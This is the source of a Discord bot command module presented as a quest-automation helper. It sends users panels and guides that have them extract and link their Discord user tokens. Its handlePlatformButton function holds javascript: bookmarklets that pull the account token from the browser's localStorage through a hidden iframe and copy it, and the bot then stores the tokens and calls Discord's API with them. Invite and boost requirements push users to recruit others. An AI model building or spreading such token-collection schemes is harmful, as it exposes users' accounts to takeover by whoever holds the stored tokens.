import {
    SlashCommandBuilder,
    ContainerBuilder,
    TextDisplayBuilder,
    SeparatorBuilder,
    SeparatorSpacingSize,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    MessageFlags,
    StringSelectMenuBuilder,
    StringSelectMenuOptionBuilder,
    EmbedBuilder,
} from 'discord.js';
import fs from 'fs';
import path from 'path';
import { MongoClient } from 'mongodb';
import { QuestClient } from '../quest/questClient.js';
import { TokenStore } from '../quest/tokenStore.js';
import { enableAutoquest, disableAutoquest, isAutoquestEnabled } from '../quest/autoquestStore.js';
import { PREFIX } from '../utils/config.js';
import { QuestManager } from '../quest/questManager.js';

const uri = process.env.MONGO_URI || process.env.MONGODB_URI;
let dbInstance;

const activeQuestUsers = new Set();

async function getDatabase() {
    if (dbInstance) return dbInstance;
    const client = new MongoClient(uri);
    await client.connect();
    dbInstance = client.db();
    return dbInstance;
}

async function checkQuestChannel(interactionOrMessage) {
    if (!interactionOrMessage.guild) return true; 
    
    if (typeof interactionOrMessage.isCommand === 'function' || interactionOrMessage.isChatInputCommand?.()) {
        if (!interactionOrMessage.deferred && !interactionOrMessage.replied) {
            await interactionOrMessage.deferReply({ flags: MessageFlags.Ephemeral }).catch(() => {});
        }
    }

    try {
        const db = await getDatabase();
        const settings = await db.collection('guildSettings').findOne({ guildId: interactionOrMessage.guild.id });
        if (settings && settings.questChannelId) {
            const currentChannelId = interactionOrMessage.channelId || interactionOrMessage.channel?.id;
            if (currentChannelId !== settings.questChannelId) {
                const payload = {
                    content: `❌ Quest commands can only be used in <#${settings.questChannelId}>!`,
                    flags: MessageFlags.Ephemeral
                };
                
                if (interactionOrMessage.deferred || interactionOrMessage.replied) {
                    await interactionOrMessage.editReply(payload).catch(() => {});
                } else if (typeof interactionOrMessage.reply === 'function') {
                    await interactionOrMessage.reply(payload).catch(() => {});
                } else if (interactionOrMessage.channel && typeof interactionOrMessage.channel.send === 'function') {
                    await interactionOrMessage.channel.send(payload).catch(() => {});
                }
                return false;
            }
        }
    } catch (err) {
        console.error('[QuestChannel Check Error]:', err);
    }
    return true;
}

export function makeTokenStore(secret) {
    return new TokenStore(secret);
}

async function getUserInvites(userId) {
    try {
        const db = await getDatabase();
        const collections = ['invites', 'users', 'inviteTracker'];
        
        for (const colName of collections) {
            const collection = db.collection(colName);
            const inviteData = await collection.findOne({ 
                $or: [
                    { userId: userId },
                    { id: userId },
                    { _id: userId }
                ]
            });

            if (inviteData) {
                const finalCount = Number(
                    inviteData.invites || 
                    inviteData.count || 
                    inviteData.total || 
                    inviteData.inviteCount || 
                    inviteData.regular || 
                    inviteData.uses?.total || 
                    0
                );
                if (finalCount > 0) return finalCount;
            }
        }
        return 0;
    } catch (err) {
        console.error('[MongoDB Invite Fetch Error]:', err);
        return 0;
    }
}

async function checkSlot1Access(member, userId) {
    const hasQuestAccessRole = member?.roles?.cache?.some(role => role.name === 'Quest Access');
    if (hasQuestAccessRole) return true; 

    const userInvites = await getUserInvites(userId);
    return userInvites >= 2;
}

function checkSlot2Access(member) {
    if (!member) return false;
    
    const isBooster = member.premiumSince !== null || member.roles?.premiumSubscriberRole;
    const customBoostRole = member.guild?.roles.cache.find(r => r.name.toLowerCase().includes('boost'));
    const hasCustomBoostRole = customBoostRole && member.roles?.cache.has(customBoostRole.id);

    return Boolean(isBooster || hasCustomBoostRole);
}

function sanitizeToken(raw) {
    if (!raw || typeof raw !== 'string') return '';
    return raw.trim()
        .replace(/^```[\w]*\n?/, '').replace(/\n?```$/, '')
        .replace(/^`+|`+$/g, '')
        .replace(/^Bot\s+/i, '')
        .trim();
}

function isValidUserToken(token) {
    if (!token || typeof token !== 'string') return false;
    return token.length >= 50 && /^[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+$/.test(token);
}

async function buildMultiSlotPanel(userId, member, tokenStore) {
    const slot1Token = await tokenStore.get(`${userId}_slot_1`);
    const slot2Token = await tokenStore.get(`${userId}_slot_2`);

    const userInvites = await getUserInvites(userId);
    const hasRole = member?.roles?.cache?.some(role => role.name === 'Quest Access') || false;
    
    const isSlot1Unlocked = hasRole || userInvites >= 2;

    const maxInvites = 2;
    const currentInvites = Math.min(userInvites, maxInvites);
    const filledBlocks = '🟩'.repeat(currentInvites);
    const emptyBlocks = '⬛'.repeat(maxInvites - currentInvites);
    const progressBar = `${filledBlocks}${emptyBlocks} (${userInvites}/${maxInvites} Invites)`;

    async function getAccountDetails(token) {
        if (!token) return { status: 'Inactive', age: 'N/A', linkedAt: 'N/A' };
        try {
            const res = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: token } });
            if (res.ok) {
                const data = await res.json();
                const createdAt = new Date(Number((BigInt(data.id) >> 22n) + 1420070400000n));
                const now = new Date();
                const diffTime = Math.abs(now - createdAt);
                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
                const ageYears = (diffDays / 365).toFixed(1);
                
                return {
                    status: `**${data.global_name || data.username}**`,
                    age: `${ageYears} Years`,
                    linkedAt: new Date().toLocaleDateString()
                };
            }
        } catch (e) {}
        return { status: 'Connected (Error)', age: 'N/A', linkedAt: 'N/A' };
    }

    const slot1Info = await getAccountDetails(slot1Token);
    const slot2Info = await getAccountDetails(slot2Token);

    const headerContainer = new ContainerBuilder().setAccentColor(0x5865F2);
    headerContainer.addTextDisplayComponents(
        new TextDisplayBuilder().setContent(
            `# ⚡ Nexus Quest Central\n` +
            `> Manage your linked accounts and automate your Discord quests securely.\n` +
            `-# Need help getting started? Use \`${PREFIX}guide\` for instructions.`
        ),
    );

    const slot1Container = new ContainerBuilder().setAccentColor(isSlot1Unlocked ? 0x57F287 : 0xED4245);
    slot1Container.addTextDisplayComponents(
        new TextDisplayBuilder().setContent(
            `### 🔒 Slot #1 (Invite Tier)\n` +
            `• **Progress:** ${progressBar}\n` +
            `• **Account:** ${slot1Token ? slot1Info.status : 'Not Linked'}\n` +
            `• **Account Age:** ${slot1Info.age}\n` +
            `-# ${isSlot1Unlocked ? '✅ Access Granted' : '❌ Complete 2 invites to unlock this'}`
        ),
    );

    const slot1Row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId(slot1Token ? 'btn_unlink_slot_1' : 'btn_link_slot_1')
            .setLabel(slot1Token ? 'Unlink Slot 1' : (isSlot1Unlocked ? 'Link Account' : 'Complete 2 invites to unlock this'))
            .setStyle(slot1Token ? ButtonStyle.Danger : (isSlot1Unlocked ? ButtonStyle.Success : ButtonStyle.Secondary))
    );

    const slot2Unlocked = checkSlot2Access(member);
    const slot2Container = new ContainerBuilder().setAccentColor(slot2Unlocked ? 0x57F287 : 0xED4245);
    slot2Container.addTextDisplayComponents(
        new TextDisplayBuilder().setContent(
            `### 🚀 Slot #2 (Booster Tier)\n` +
            `• **Requirement:** Server Booster / Custom Boost Role\n` +
            `• **Account:** ${slot2Token ? slot2Info.status : 'Not Linked'}\n` +
            `• **Account Age:** ${slot2Info.age}\n` +
            `-# ${slot2Unlocked ? '✅ Booster Access Active' : '❌ Requires Server Boost'}`
        ),
    );

    const slot2Row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId(slot2Token ? 'btn_unlink_slot_2' : 'btn_link_slot_2')
            .setLabel(slot2Token ? 'Unlink Slot 2' : 'Link Booster Slot')
            .setStyle(slot2Token ? ButtonStyle.Danger : ButtonStyle.Success)
    );

    const guideContainer = new ContainerBuilder().setAccentColor(0x2b2d31);
    guideContainer.addTextDisplayComponents(
        new TextDisplayBuilder().setContent(
            `# 📚 Quick Setup Platform Selector\n` +
            `-# Choose your device to view token extraction steps:`,
        ),
    );
    const platformRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_pc').setLabel('💻 PC Guide').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('btn_android').setLabel('🤖 Android Guide').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('btn_ios').setLabel('🍎 iOS Guide').setStyle(ButtonStyle.Secondary),
    );

    return { 
        components: [headerContainer, slot1Container, slot1Row, slot2Container, slot2Row, guideContainer, platformRow], 
        flags: MessageFlags.IsComponentsV2 
    };
}

export const guideCmd = {
    data: new SlashCommandBuilder().setName('guide').setDescription('View the token linking and platform setup guide in your DMs'),
    prefix: 'guide',
    async execute(interaction, client) {
        if (!await checkQuestChannel(interaction)) return;
        
        const guideContainer = new ContainerBuilder().setAccentColor(0x5865F2);
        guideContainer.addTextDisplayComponents(
            new TextDisplayBuilder().setContent(
                `# 👑 Script Help & Guide\n\n` +
                `Use the guide below to get your Discord token for quest completion.\n\n` +
                `Choose the device you want to use to get your token by clicking the buttons below:`
            ),
        );

        const platformRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_ios').setLabel('iOS').setStyle(ButtonStyle.Secondary).setEmoji('🍎'),
            new ButtonBuilder().setCustomId('btn_android').setLabel('Phone').setStyle(ButtonStyle.Secondary).setEmoji('📱'),
            new ButtonBuilder().setCustomId('btn_pc').setLabel('Computer').setStyle(ButtonStyle.Secondary).setEmoji('💻'),
        );

        try {
            // User ke DM mein message bhejne ke liye
            await interaction.user.send({ 
                content: `🌐 **Join our support server:** https://discord.gg/ZpvmmyHb3Q`,
                components: [guideContainer, platformRow],
                flags: MessageFlags.IsComponentsV2 
            });

            // Server channel mein ephemeral reply ki DM bhej diya gaya hai
            await interaction.editReply({ content: `📬 Check your DMs for the guide and instructions!` });
        } catch (err) {
            console.error('[Guide DM Error]:', err);
            await interaction.editReply({ content: `❌ Could not send you a DM. Please make sure your DMs are open!` });
        }
    },
    async prefixExecute(message, _args, client) {
        if (!await checkQuestChannel(message)) return;

        const guideContainer = new ContainerBuilder().setAccentColor(0x5865F2);
        guideContainer.addTextDisplayComponents(
            new TextDisplayBuilder().setContent(
                `# 👑 Script Help & Guide\n\n` +
                `Use the guide below to get your Discord token for quest completion.\n\n` +
                `Choose the device you want to use to get your token by clicking the buttons below:`
            ),
        );

        const platformRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_ios').setLabel('iOS').setStyle(ButtonStyle.Secondary).setEmoji('🍎'),
            new ButtonBuilder().setCustomId('btn_android').setLabel('Phone').setStyle(ButtonStyle.Secondary).setEmoji('📱'),
            new ButtonBuilder().setCustomId('btn_pc').setLabel('Computer').setStyle(ButtonStyle.Secondary).setEmoji('💻'),
        );

        try {
            await message.author.send({ 
                content: `🌐 **Join our support server:** https://discord.gg/ZpvmmyHb3Q`,
                components: [guideContainer, platformRow],
                flags: MessageFlags.IsComponentsV2 
            });
            await message.reply({ content: `📬 Check your DMs for the guide!` });
        } catch (err) {
            console.error('[Guide Prefix DM Error]:', err);
            await message.reply({ content: `❌ Could not send you a DM. Please enable your DMs!` });
        }
    },
};

export const linkCmd = {
    data: new SlashCommandBuilder().setName('link').setDescription('Save your Discord token via DM panel'),
    prefix: 'link',
    async execute(interaction, client) {
        if (!await checkQuestChannel(interaction)) return;
        try {
            const panel = await buildMultiSlotPanel(interaction.user.id, interaction.member, client.tokenStore);
            await interaction.user.send(panel);
            await interaction.editReply({ content: `📬 Check your DMs for the account linking panel!` });
        } catch (err) {
            await interaction.editReply({ content: `❌ Could not send panel to your DMs. Please check your privacy settings.` });
        }
    },
    async prefixExecute(message, args, client) {
        if (!await checkQuestChannel(message)) return;
        try {
            const panel = await buildMultiSlotPanel(message.author.id, message.member, client.tokenStore);
            await message.author.send(panel);
            await message.reply({ content: `📬 Check your DMs for the account linking panel!` });
        } catch (err) {
            await message.reply({ content: `❌ Could not send panel to your DMs.` });
        }
    },
};

// Baaki saare functions aur handlers waise hi rahenge...
export async function handlePlatformButton(interaction) {
    const customId = interaction.customId;
    if (customId !== 'btn_pc' && customId !== 'btn_android' && customId !== 'btn_ios') return;

    if (customId === 'btn_pc') {
        const pcScript = `javascript:(function(){var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){try{t=JSON.parse(t)}catch(e){}var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();var n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#1a1a2e;color:#e94560;padding:15px 20px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.5);font-family:Arial,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s;';document.body.appendChild(n);setTimeout(function(){n.style.opacity='1'},50);setTimeout(function(){n.style.opacity='0';setTimeout(function(){n.remove()},500)},3500)}else{alert('No token found. Make sure you are logged into Discord on this browser.')}})();`;
        const pcVideo = 'https://cdn.discordapp.com/attachments/1470058692660428842/1542354901202501722/1787760131788714.mov';
        await interaction.reply({ content: `### 💻 PC Token Setup Guide\n\`\n${pcScript}\n\`\n${pcVideo}`, flags: MessageFlags.Ephemeral }).catch(() => {});
        return;
    }

    if (customId === 'btn_android') {
        const androidScript = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Orbie Token Finder</strong><br>Your Account T0k8n Has Copied Successfully';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>{n.style.opacity='1';},50);setTimeout(()=>{n.style.opacity='0';setTimeout(()=>n.remove(),500);},3500);}catch(e){alert('Error copying token');}})();`;
        const androidVideo = 'https://cdn.discordapp.com/attachments/1539722714036699276/1542207446423048342/lv_0_20260826215752.mp4';
        await interaction.reply({ content: `### 🤖 Android Token Setup Guide\n\`\n${androidScript}\n\`\n${androidVideo}`, flags: MessageFlags.Ephemeral }).catch(() => {});
        return;
    }

    if (customId === 'btn_ios') {
        const iosScript = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Orbie Token Finder</strong><br>Your Account T0k8n Has Copied Successfully';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>{n.style.opacity='1';},50);setTimeout(()=>{n.style.opacity='0';setTimeout(()=>n.remove(),500);},3500);}catch(e){alert('Error copying token');}})();`;
        const iosVideo = 'https://cdn.discordapp.com/attachments/1539722714036699276/1542207446423048342/lv_0_20260826215752.mp4';
        await interaction.reply({ content: `### 🍎 iOS Token Setup Guide\n\`\n${iosScript}\n\`\n${iosVideo}`, flags: MessageFlags.Ephemeral }).catch(() => {});
        return;
    }
}

